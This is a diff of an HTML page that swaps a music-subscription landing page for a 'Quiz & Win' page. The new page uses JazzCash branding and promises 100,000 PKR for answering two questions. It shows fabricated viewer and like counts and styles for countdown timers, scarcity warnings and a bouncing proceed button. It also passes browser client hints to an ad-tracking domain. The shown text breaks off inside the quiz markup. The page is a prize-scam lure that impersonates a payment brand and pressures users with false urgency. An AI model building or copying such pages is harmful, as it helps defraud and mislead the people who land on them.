@@ -1,630 +1,1178 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Beat Market — Fresh Naija Hits, New Stock Daily</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Anton&family=Space+Mono:wght@400;700&family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-<style>
-  :root{
-    --ink:#1B1B1F;
-    --cream:#FFF8E7;
-    --sun:#FFC93C;
-    --green:#0A7B3E;
-    --red:#E63946;
-    --pink:#FF3D7F;
-    --paper-line: rgba(27,27,31,0.12);
-    --radius: 14px;
-  }
-  *{box-sizing:border-box;}
-  html{scroll-behavior:smooth;}
-  body{
-    margin:0;
-    background:var(--cream);
-    color:var(--ink);
-    font-family:'Sora', sans-serif;
-    line-height:1.5;
-    -webkit-font-smoothing:antialiased;
-  }
-  h1,h2,h3,.display{
-    font-family:'Anton', sans-serif;
-    font-weight:400;
-    letter-spacing:0.5px;
-    text-transform:uppercase;
-    line-height:1.05;
-    margin:0;
-  }
-  .mono{ font-family:'Space Mono', monospace; }
-  a{ color:inherit; }
-  img{ max-width:100%; display:block; }
-  .wrap{
-    max-width:1080px;
-    margin:0 auto;
-    padding:0 24px;
-  }
-  :focus-visible{
-    outline:3px solid var(--ink);
-    outline-offset:3px;
-  }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Quiz & Win | Exclusive Reward</title>
+  <style>
+    :root {
+      --bg: #000000;
+      --card-bg: #0a0a0a;
+      --border: #222;
+      --primary: #25D366;
+      --accent: #FFD700;
+      --text: #ffffff;
+      --text-muted: #888888;
+      --glow-green: rgba(37, 211, 102, 0.4);
+      --glow-yellow: rgba(255, 215, 0, 0.3);
+      --font-main: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;
+    }
 
-  /* ---------- topbar ---------- */
-  .topbar{
-    border-bottom:4px solid var(--ink);
-    background:
-      repeating-linear-gradient(90deg, var(--green) 0 14px, var(--red) 14px 28px) top/100% 6px no-repeat,
-      var(--cream);
-    padding-top:6px;
-  }
-  .topbar-inner{
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    padding:16px 24px;
-  }
-  .brand{
-    font-size:22px;
-    display:flex;
-    align-items:center;
-    gap:10px;
-  }
-  .brand-dot{
-    width:12px;height:12px;border-radius:50%;
-    background:var(--red);
-    display:inline-block;
-  }
-  .topbar a.cta-mini{
-    font-family:'Sora',sans-serif;
-    font-weight:700;
-    font-size:13px;
-    text-transform:uppercase;
-    letter-spacing:0.5px;
-    background:var(--ink);
-    color:var(--cream);
-    padding:10px 16px;
-    border-radius:999px;
-    text-decoration:none;
-    white-space:nowrap;
-  }
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
 
-  /* ---------- hero ---------- */
-  .hero{
-    background:var(--sun);
-    border-bottom:4px solid var(--ink);
-    padding:56px 0 0 0;
-    position:relative;
-    overflow:hidden;
-  }
-  .hero-grid{
-    display:grid;
-    gap:28px;
-    padding-bottom:48px;
-  }
-  .eyebrow{
-    display:inline-flex;
-    align-items:center;
-    gap:8px;
-    font-family:'Space Mono', monospace;
-    font-size:12px;
-    text-transform:uppercase;
-    letter-spacing:1.5px;
-    background:var(--ink);
-    color:var(--sun);
-    padding:7px 12px;
-    border-radius:999px;
-    margin-bottom:18px;
-  }
-  .hero h1{
-    font-size:clamp(40px, 9vw, 78px);
-    max-width:14ch;
-  }
-  .hero h1 span{
-    -webkit-text-stroke:2px var(--ink);
-    color:var(--sun);
-  }
-  .hero p.sub{
-    font-size:18px;
-    max-width:46ch;
-    margin-top:18px;
-    font-weight:500;
-  }
-  .hero-ctas{
-    display:flex;
-    flex-wrap:wrap;
-    gap:14px;
-    margin-top:30px;
-    align-items:center;
-  }
-  .btn-primary{
-    display:inline-flex;
-    align-items:center;
-    gap:10px;
-    background:var(--red);
-    color:var(--cream);
-    font-family:'Anton', sans-serif;
-    text-transform:uppercase;
-    font-size:18px;
-    letter-spacing:0.5px;
-    padding:18px 28px;
-    border-radius:10px;
-    text-decoration:none;
-    border:3px solid var(--ink);
-    box-shadow:5px 5px 0 var(--ink);
-    transition:transform .15s ease, box-shadow .15s ease;
-  }
-  .btn-primary:hover{
-    transform:translate(2px,2px);
-    box-shadow:3px 3px 0 var(--ink);
-  }
-  .price-note{
-    font-family:'Space Mono', monospace;
-    font-size:13px;
-  }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      overflow-x: hidden;
+      position: relative;
+    }
 
-  /* marquee */
-  .marquee-band{
-    background:var(--ink);
-    color:var(--cream);
-    overflow:hidden;
-    white-space:nowrap;
-    border-top:3px solid var(--ink);
-  }
-  .marquee-track{
-    display:inline-block;
-    padding:12px 0;
-    animation:scroll 26s linear infinite;
-  }
-  .marquee-track span{
-    font-family:'Space Mono', monospace;
-    font-size:13px;
-    letter-spacing:0.5px;
-    margin-right:48px;
-    text-transform:uppercase;
-  }
-  @keyframes scroll{
-    0%{ transform:translateX(0); }
-    100%{ transform:translateX(-50%); }
-  }
-  @media (prefers-reduced-motion: reduce){
-    .marquee-track{ animation:none; overflow-x:auto; }
-  }
+    #particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+      overflow: hidden;
+    }
+    .particle {
+      position: absolute;
+      border-radius: 50%;
+      opacity: 0.4;
+      animation: float linear infinite;
+    }
+    @keyframes float {
+      0% { transform: translateY(100vh) scale(0.8); opacity: 0; }
+      15% { opacity: 0.6; }
+      85% { opacity: 0.6; }
+      100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+    }
 
-  /* ---------- section heading pattern ---------- */
-  .section{ padding:64px 0; }
-  .section-head{
-    display:flex;
-    align-items:baseline;
-    gap:14px;
-    margin-bottom:36px;
-    flex-wrap:wrap;
-  }
-  .section-head h2{
-    font-size:clamp(28px,5vw,40px);
-  }
-  .section-head .tag{
-    font-family:'Space Mono', monospace;
-    font-size:12px;
-    text-transform:uppercase;
-    letter-spacing:1px;
-    color:var(--ink);
-    opacity:0.55;
-  }
+    .container {
+      width: 100%;
+      max-width: 480px;
+      padding: 16px 20px 80px;
+      z-index: 10;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
 
-  /* ---------- features (stamps) ---------- */
-  .stamp-grid{
-    display:grid;
-    grid-template-columns:repeat(auto-fit, minmax(220px,1fr));
-    gap:20px;
-  }
-  .stamp{
-    border:3px solid var(--ink);
-    border-radius:var(--radius);
-    padding:24px;
-    background:var(--cream);
-    position:relative;
-  }
-  .stamp::before{
-    content:"";
-    position:absolute;
-    top:14px; right:14px;
-    width:34px; height:34px;
-    border-radius:50%;
-    border:2px dashed var(--ink);
-    opacity:0.35;
-  }
-  .stamp h3{
-    font-size:20px;
-    margin-bottom:8px;
-  }
-  .stamp p{
-    font-size:14.5px;
-    margin:0;
-    opacity:0.85;
-  }
-  .stamp.c1{ border-color:var(--green); }
-  .stamp.c2{ border-color:var(--red); }
-  .stamp.c3{ border-color:var(--pink); }
-  .stamp.c4{ border-color:var(--ink); }
+    header {
+      width: 100%;
+      padding: 12px 24px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 13px;
+      letter-spacing: 2px;
+      color: var(--text-muted);
+      text-transform: lowercase;
+      font-weight: 700;
+    }
+    .logo-jazzcash {
+      color: #e80000;
+      text-shadow: 0 0 10px rgba(232,0,0,0.5);
+      letter-spacing: 2px;
+      border-bottom: 2px solid var(--accent);
+      padding-bottom: 4px;
+      text-transform: lowercase;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-weight: 800;
+    }
+    .logo-jazzcash img {
+      height: 28px;
+      object-fit: contain;
+    }
 
-  /* ---------- how it works ---------- */
-  .steps{
-    display:grid;
-    grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
-    gap:0;
-    border:3px solid var(--ink);
-    border-radius:var(--radius);
-    overflow:hidden;
-  }
-  .step{
-    padding:30px 26px;
-    border-right:3px solid var(--ink);
-    background:var(--cream);
-  }
-  .step:last-child{ border-right:none; }
-  .step .num{
-    font-family:'Anton', sans-serif;
-    font-size:46px;
-    -webkit-text-stroke:1.5px var(--ink);
-    color:var(--cream);
-    display:block;
-    margin-bottom:8px;
-  }
-  .step h3{ font-size:17px; margin-bottom:6px; text-transform:none; }
-  .step p{ font-size:14px; opacity:0.85; margin:0; }
+    h1 {
+      font-size: clamp(28px, 7vw, 40px);
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      background: linear-gradient(to right, #fff 40%, var(--accent));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 20px var(--glow-yellow);
+      margin-top: 10px;
+      margin-bottom: 6px;
+    }
+    h2 {
+      font-size: clamp(20px, 5vw, 26px);
+      font-weight: 700;
+      color: #FFD700;
+      margin-bottom: 10px;
+      text-shadow: 0 0 15px rgba(255,215,0,0.5);
+    }
+    .sub {
+      font-size: 15px;
+      color: var(--text-muted);
+      max-width: 85%;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
 
-  /* ---------- genres (dark) ---------- */
-  .genres-section{
-    background:var(--ink);
-    color:var(--cream);
-    border-top:4px solid var(--ink);
-    border-bottom:4px solid var(--ink);
-  }
-  .genres-section .section-head .tag{ color:var(--cream); opacity:0.6; }
-  .chip-row{
-    display:flex;
-    flex-wrap:wrap;
-    gap:12px;
-  }
-  .chip{
-    font-family:'Space Mono', monospace;
-    font-size:13px;
-    text-transform:uppercase;
-    letter-spacing:0.5px;
-    padding:11px 18px;
-    border-radius:999px;
-    border:2px solid var(--cream);
-  }
-  .chip:nth-child(6n+1){ background:var(--red); border-color:var(--red); }
-  .chip:nth-child(6n+2){ background:var(--green); border-color:var(--green); }
-  .chip:nth-child(6n+3){ background:var(--pink); border-color:var(--pink); }
-  .chip:nth-child(6n+4){ background:var(--sun); color:var(--ink); border-color:var(--sun); }
-  .chip:nth-child(6n+5){ background:transparent; }
-  .chip:nth-child(6n+6){ background:var(--cream); color:var(--ink); border-color:var(--cream); }
+    .engagement {
+      display: flex;
+      gap: 20px;
+      justify-content: center;
+      margin-bottom: 16px;
+      font-size: 13px;
+      font-weight: 500;
+      color: #ccc;
+      background: rgba(255,255,255,0.04);
+      padding: 8px 14px;
+      border-radius: 30px;
+      border: 1px solid #1a1a1a;
+    }
+    .engagement span { display: flex; align-items: center; gap: 4px; white-space: nowrap; }
+    .live-dot { width: 6px; height: 6px; background: #25D366; border-radius: 50%; display: inline-block; animation: blink 1.5s infinite; margin-right: 2px; }
+    @keyframes blink { 50% { opacity: 0.3; } }
 
-  /* ---------- pricing / scratch card (signature) ---------- */
-  .pricing-section{ background:var(--sun); border-bottom:4px solid var(--ink); }
-  .pricing-grid{
-    display:grid;
-    grid-template-columns:1fr;
-    gap:28px;
-    align-items:center;
-    max-width:520px;
-    margin:0 auto;
-  }
-  .recharge-card{
-    border:3px solid var(--ink);
-    border-radius:18px;
-    background:var(--cream);
-    overflow:hidden;
-    box-shadow:8px 8px 0 var(--ink);
-  }
-  .recharge-top{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    padding:16px 22px;
-    border-bottom:2px dashed var(--ink);
-  }
-  .recharge-top .brand{
-    font-size:16px;
-  }
-  .recharge-top .mono{
-    font-size:11px;
-    opacity:0.6;
-    text-transform:uppercase;
-  }
-  .scratch-panel{
-    margin:22px;
-    border-radius:10px;
-    padding:26px 20px;
-    text-align:center;
-    background:
-      repeating-linear-gradient(135deg, rgba(255,255,255,0.18) 0 6px, transparent 6px 12px),
-      linear-gradient(135deg,#cfd4da,#9aa3ad 45%,#cfd4da 60%, #8b94a0);
-    border:2px solid var(--ink);
-    color:var(--ink);
-  }
-  .scratch-panel .label{
-    font-family:'Space Mono', monospace;
-    font-size:12px;
-    letter-spacing:2px;
-    text-transform:uppercase;
-    opacity:0.75;
-  }
-  .scratch-panel .price{
-    font-family:'Anton', sans-serif;
-    font-size:54px;
-    margin:8px 0;
-  }
-  .scratch-panel .freq{
-    font-family:'Space Mono', monospace;
-    font-size:13px;
-    text-transform:uppercase;
-  }
-  .recharge-bottom{
-    padding:18px 22px 24px;
-  }
-  .recharge-bottom ul{
-    margin:0 0 18px;
-    padding-left:18px;
-    font-size:14px;
-  }
-  .recharge-bottom li{ margin-bottom:6px; }
-  .pricing-section .btn-primary{ width:100%; justify-content:center; }
+    /* QUIZ STYLES - MORE ATTRACTIVE */
+    .quiz-wrapper {
+      width: 100%;
+      max-width: 360px;
+      margin-bottom: 20px;
+      background: linear-gradient(145deg, #0d0d0d 0%, #111 50%, #0a0a0a 100%);
+      border: 1px solid #2a2a2a;
+      border-radius: 24px;
+      padding: 28px 22px;
+      box-shadow: 0 0 40px rgba(255,215,0,0.1), 0 0 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.03);
+      position: relative;
+      overflow: hidden;
+    }
+    .quiz-wrapper::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle at 30% 20%, rgba(255,215,0,0.03) 0%, transparent 50%),
+                  radial-gradient(circle at 70% 80%, rgba(37,211,102,0.03) 0%, transparent 50%);
+      pointer-events: none;
+    }
+    .quiz-step {
+      display: none;
+      position: relative;
+      z-index: 1;
+    }
+    .quiz-step.active {
+      display: block;
+      animation: fadeInUp 0.4s ease-out;
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(15px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .quiz-step-number {
+      display: inline-block;
+      background: linear-gradient(135deg, var(--accent), #FFA500);
+      color: #000;
+      font-weight: 800;
+      font-size: 11px;
+      padding: 4px 12px;
+      border-radius: 20px;
+      margin-bottom: 14px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+    .quiz-question {
+      font-size: 19px;
+      font-weight: 700;
+      margin-bottom: 22px;
+      color: #fff;
+      line-height: 1.4;
+    }
+    .quiz-question .highlight {
+      color: var(--accent);
+    }
+    .quiz-options {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .quiz-options.horizontal {
+      flex-direction: row;
+      gap: 14px;
+    }
+    .quiz-options.horizontal .quiz-option {
+      flex: 1;
+      text-align: center;
+      justify-content: center;
+      padding: 18px 14px;
+    }
+    .quiz-option {
+      background: linear-gradient(135deg, #141414 0%, #0f0f0f 100%);
+      border: 1.5px solid #2a2a2a;
+      border-radius: 16px;
+      padding: 16px 18px;
+      font-size: 15px;
+      font-weight: 600;
+      color: #ddd;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-align: left;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      position: relative;
+      overflow: hidden;
+    }
+    .quiz-option::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(255,215,0,0.05) 0%, transparent 50%);
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    .quiz-option:hover {
+      border-color: var(--accent);
+      background: linear-gradient(135deg, #1a1a1a 0%, #141414 100%);
+      color: #fff;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.4);
+    }
+    .quiz-option:hover::after {
+      opacity: 1;
+    }
+    .quiz-option.selected {
+      border-color: var(--primary);
+      background: linear-gradient(135deg, #0d1a12 0%, #0a150f 100%);
+      color: #fff;
+      box-shadow: 0 0 20px var(--glow-green), 0 0 40px rgba(37,211,102,0.1);
+      transform: translateY(-2px);
+    }
+    .quiz-option.selected .option-badge {
+      background: var(--primary);
+      color: #000;
+    }
+    .quiz-option .option-icon {
+      font-size: 26px;
+      flex-shrink: 0;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));
+    }
+    .quiz-option .option-badge {
+      width: 32px;
+      height: 32px;
+      border-radius: 10px;
+      background: #1a1a1a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      font-size: 14px;
+      flex-shrink: 0;
+      transition: all 0.3s ease;
+      border: 1px solid #333;
+    }
 
-  /* ---------- networks ---------- */
-  .network-row{
-    display:flex;
-    flex-wrap:wrap;
-    gap:14px;
-    justify-content:center;
-  }
-  .network-badge{
-    border:2.5px solid var(--ink);
-    border-radius:10px;
-    padding:14px 22px;
-    font-family:'Space Mono', monospace;
-    font-weight:700;
-    font-size:14px;
-    letter-spacing:0.5px;
-    background:var(--cream);
-  }
+    /* LOADING / PROCESSING SCREEN */
+    .processing-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      padding: 10px 0;
+      position: relative;
+      z-index: 1;
+    }
+    .processing-screen.active {
+      display: flex;
+      animation: fadeInUp 0.4s ease-out;
+    }
+    .processing-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 6px;
+      text-align: center;
+    }
+    .processing-title .pulse-icon {
+      display: inline-block;
+      animation: pulse-icon 1.5s infinite;
+    }
+    @keyframes pulse-icon {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.2); }
+    }
+    .processing-step {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 13px;
+      color: #666;
+      width: 100%;
+      padding: 12px 16px;
+      background: #0d0d0d;
+      border-radius: 12px;
+      border: 1px solid #1a1a1a;
+      opacity: 0.5;
+      transition: all 0.4s ease;
+    }
+    .processing-step.done {
+      color: var(--primary);
+      border-color: var(--primary);
+      opacity: 1;
+      background: #0d1a12;
+    }
+    .processing-step.done .step-icon {
+      color: var(--primary);
+    }
+    .processing-step.active-step {
+      color: #FFD700;
+      border-color: #FFD700;
+      opacity: 1;
+      background: #1a1a0d;
+      animation: pulse-step 1s infinite;
+    }
+    @keyframes pulse-step {
+      0%, 100% { box-shadow: 0 0 8px rgba(255,215,0,0.15); }
+      50% { box-shadow: 0 0 20px rgba(255,215,0,0.35); }
+    }
+    .step-icon {
+      font-size: 18px;
+      width: 26px;
+      text-align: center;
+      flex-shrink: 0;
+    }
+    .spinner-small {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #333;
+      border-top: 2px solid #FFD700;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
 
-  /* ---------- terms ---------- */
-  .terms-box{
-    border:3px solid var(--ink);
-    border-radius:var(--radius);
-    background:var(--cream);
-    padding:28px;
-  }
-  .terms-box h3{
-    font-size:18px;
-    margin-bottom:14px;
-    text-transform:none;
-  }
-  .terms-box p, .terms-box li{
-    font-size:14.5px;
-    opacity:0.9;
-  }
-  .terms-box ul{ padding-left:18px; margin:0; }
-  .terms-box li{ margin-bottom:8px; }
+    .sponsor {
+      margin-top: 16px;
+      font-size: 13px;
+      color: var(--text-muted);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      opacity: 0.95;
+      flex-wrap: wrap;
+      background: rgba(255,255,255,0.03);
+      padding: 10px 16px;
+      border-radius: 40px;
+      border: 1px solid #1a1a1a;
+    }
+    .sponsor-logo {
+      height: 26px;
+      object-fit: contain;
+      filter: brightness(1.1) drop-shadow(0 2px 4px rgba(0,0,0,0.5));
+      transition: transform 0.2s;
+    }
+    .sponsor-logo:hover { transform: scale(1.05); }
+    .sponsor-separator {
+      width: 1px;
+      height: 20px;
+      background: #333;
+      margin: 0 2px;
+    }
+    .brand-tag {
+      background: rgba(255,255,255,0.08);
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-weight: 700;
+      font-size: 11px;
+      color: #ddd;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .brand-tag.hd {
+      background: linear-gradient(135deg, #FFD700, #FFA500);
+      color: #000;
+      font-weight: 800;
+    }
 
-  /* ---------- footer ---------- */
-  footer{
-    background:var(--ink);
-    color:var(--cream);
-    padding:40px 0 28px;
-  }
-  footer .foot-grid{
-    display:flex;
-    flex-wrap:wrap;
-    justify-content:space-between;
-    gap:20px;
-    border-bottom:1px solid rgba(255,248,231,0.2);
-    padding-bottom:24px;
-    margin-bottom:18px;
-  }
-  footer .brand{ font-size:18px; }
-  footer p{ font-size:13px; opacity:0.7; margin:0; max-width:50ch; }
-  footer .fine{ font-size:12px; opacity:0.55; }
+    #comments-section {
+      width: 100%;
+      max-width: 400px;
+      margin-top: 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .section-label {
+      font-size: 12px;
+      color: #666;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .comment-card {
+      background: var(--card-bg);
+      border: 1px solid #1a1a1a;
+      padding: 10px 12px;
+      border-radius: 12px;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      animation: slideIn 0.3s ease-out forwards;
+      opacity: 0;
+      transform: translateY(-5px);
+    }
+    .comment-avatar {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #333, #111);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      color: #fff;
+      font-weight: 600;
+      border: 1px solid #333;
+    }
+    .comment-content { display: flex; flex-direction: column; text-align: left; }
+    .comment-name { color: #aaa; font-weight: 500; font-size: 12px; }
+    .comment-text { color: #eee; line-height: 1.3; margin-top: 2px; }
+    @keyframes slideIn { to { opacity: 1; transform: translateY(0); } }
 
-  @media (max-width:640px){
-    .step{ border-right:none; border-bottom:3px solid var(--ink); }
-    .step:last-child{ border-bottom:none; }
-    .recharge-card{ box-shadow:5px 5px 0 var(--ink); }
-  }
-</style>
+    .comment-input-wrap {
+      display: flex;
+      gap: 8px;
+      margin-top: 10px;
+      background: #0f0f0f;
+      border: 1px solid #252525;
+      border-radius: 50px;
+      padding: 6px;
+    }
+    #userComment {
+      flex: 1;
+      background: transparent;
+      border: none;
+      color: #fff;
+      padding: 8px 14px;
+      font-size: 13px;
+      outline: none;
+    }
+    #userComment::placeholder { color: #555; }
+    #postComment {
+      background: var(--primary);
+      color: #000;
+      border: none;
+      border-radius: 30px;
+      padding: 8px 16px;
+      font-weight: 600;
+      font-size: 13px;
+      cursor: pointer;
+    }
+    #postComment:disabled { opacity: 0.5; cursor: default; }
+
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.88);
+      backdrop-filter: blur(14px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+      padding: 20px;
+    }
+    #initialModal {
+      display: flex;
+    }
+    .modal {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 26px 22px;
+      width: 100%;
+      max-width: 340px;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.85);
+      animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .modal h3 { font-size: 18px; font-weight: 800; margin-bottom: 8px; color: #fff; line-height: 1.4; }
+    .modal p { font-size: 13px; color: #999; margin-bottom: 14px; line-height: 1.4; }
+    .modal-info {
+      background: #0d0d0d;
+      border-radius: 12px;
+      padding: 14px;
+      margin-bottom: 16px;
+      text-align: left;
+      font-size: 13px;
+      color: #bbb;
+      border: 1px solid #2a2a2a;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #1f1f1f;
+      padding-bottom: 8px;
+    }
+    .info-row:last-child { border-bottom: none; padding-bottom: 0; }
+    .info-label { color: #888; font-weight: 500; }
+    .info-value { color: #fff; font-weight: 600; display: flex; align-items: center; gap: 5px; }
+    .modern-badge {
+      background: #1a2a1f;
+      color: #25D366;
+      padding: 2px 10px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    .modal-sponsor {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 12px;
+      padding: 10px;
+      background: rgba(255,255,255,0.03);
+      border-radius: 12px;
+      font-size: 12px;
+      color: #aaa;
+      flex-wrap: wrap;
+    }
+    .modal-sponsor img {
+      height: 22px;
+      object-fit: contain;
+      filter: brightness(1.1);
+    }
+    .money-img {
+      font-size: 55px;
+      margin: 15px 0;
+    }
+
+    .emergency-timer {
+      background: #1a0000;
+      border: 2px solid #ff0000;
+      border-radius: 12px;
+      padding: 12px;
+      margin: 15px 0;
+      color: #ff4444;
+      font-weight: 700;
+      font-size: 14px;
+    }
+    .timer-display {
+      font-size: 32px;
+      font-weight: 800;
+      color: #ff0000;
+      letter-spacing: 2px;
+      animation: pulse-red 1s infinite;
+    }
+    @keyframes pulse-red {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+    .timer-label {
+      font-size: 12px;
+      color: #ff6666;
+      margin-top: 4px;
+    }
+    .limited-offer {
+      background: linear-gradient(135deg, #FFD700, #FFA500);
+      color: #000;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-weight: 800;
+      font-size: 12px;
+      display: inline-block;
+      margin: 8px 0;
+      letter-spacing: 1px;
+    }
+
+    .scarcity-note {
+      background: rgba(255,215,0,0.1);
+      border: 1px solid rgba(255,215,0,0.3);
+      border-radius: 10px;
+      padding: 10px;
+      margin: 10px 0;
+      color: #FFD700;
+      font-weight: 700;
+      font-size: 13px;
+      animation: glow-pulse 2s infinite;
+    }
+    @keyframes glow-pulse {
+      0%, 100% { box-shadow: 0 0 5px rgba(255,215,0,0.2); }
+      50% { box-shadow: 0 0 15px rgba(255,215,0,0.5); }
+    }
+
+    .btn-primary, .btn-proceed, .btn-ok {
+      width: 100%;
+      padding: 13px;
+      border: none;
+      border-radius: 50px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 8px;
+      transition: all 0.2s;
+    }
+    .btn-primary { background: var(--primary); color: #000; box-shadow: 0 4px 12px rgba(37,211,102,0.3); }
+    .btn-proceed { 
+      background: var(--primary); 
+      color: #000; 
+      box-shadow: 0 4px 12px rgba(37,211,102,0.3);
+      animation: bounce-btn 0.8s infinite;
+      font-size: 16px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+    @keyframes bounce-btn {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-6px); box-shadow: 0 8px 20px rgba(37,211,102,0.5); }
+    }
+    .btn-ok { background: #fff; color: #000; margin-top: 6px; }
+
+    .hidden { display: none !important; }
+    @media(max-width:360px) { .quiz-wrapper { width: 290px; padding: 22px 16px; } }
+
+    #confetti-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 200;
+    }
+    <meta http-equiv="delegate-ch" content="sec-ch-ua https://vtdmp.bemobtrcks.com; sec-ch-ua-mobile https://vtdmp.bemobtrcks.com; sec-ch-ua-arch https://vtdmp.bemobtrcks.com; sec-ch-ua-model https://vtdmp.bemobtrcks.com; sec-ch-ua-platform https://vtdmp.bemobtrcks.com; sec-ch-ua-platform-version https://vtdmp.bemobtrcks.com; sec-ch-ua-bitness https://vtdmp.bemobtrcks.com; sec-ch-ua-full-version-list https://vtdmp.bemobtrcks.com; sec-ch-ua-full-version https://vtdmp.bemobtrcks.com">
+  </style>
 </head>
 <body>
+  <div id="particles"></div>
+  <canvas id="confetti-canvas"></canvas>
 
-  <!-- TOPBAR -->
-  <div class="topbar">
-    <div class="topbar-inner wrap" style="padding-left:0;padding-right:0;">
-      <div class="brand display"><span class="brand-dot"></span>Beat Market</div>
-      <a class="cta-mini" href="https://wwmyokgik.one/cl/bdef323e413510a5">Get Access</a>
+  <header>
+    <span class="logo-jazzcash">
+      <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" onerror="this.style.display='none';">
+      JazzCash
+    </span>
+  </header>
+
+  <div class="container">
+    <h1>CONGRATULATIONS!</h1>
+    <h2>Answer & Win!</h2>
+    <p class="sub">Answer simple questions to win 100,000 PKR <span style="color:var(--accent); font-weight:600;">₨100,000</span> Today!</p> <p class="sub">Thousands of Pakistanis are claiming their prize today — why miss out?</p>
+   
+    <div class="engagement">
+      <span><div class="live-dot"></div> <span class="likes-text">❤️ 1,200+</span></span>
+      <span>👁️ <span class="views-text">300,000+</span> Viewers</span>
+    </div>
+
+    <!-- QUIZ REPLACES WHEEL -->
+    <div class="quiz-wrapper">
+      <!-- Step 1: Do you need the money? -->
+      <div class="quiz-step active" id="quizStep1">
+        <span class="quiz-step-number">🔹 Question 1 of 2</span>
+        <div class="quiz-question">Do you <span class="highlight">need the money</span>?</div>
+        <div class="quiz-options horizontal">
+          <div class="quiz-option" data-next="step2yes" data-purpose=""><span class="option-icon">✅</span> Yes</div>
+          <div class="quiz-option" data-next="step2no" data-purpose=""><span class="option-icon">❌</span> No</div>
+        </div>
+      </div>
+      <!-- Step 2 for YES: What do you want to use the money for? -->
+      <div class="quiz-step" id="quizStep2Yes">
+        <span class="quiz-step-number">🔹 Question 2 of 2</span>
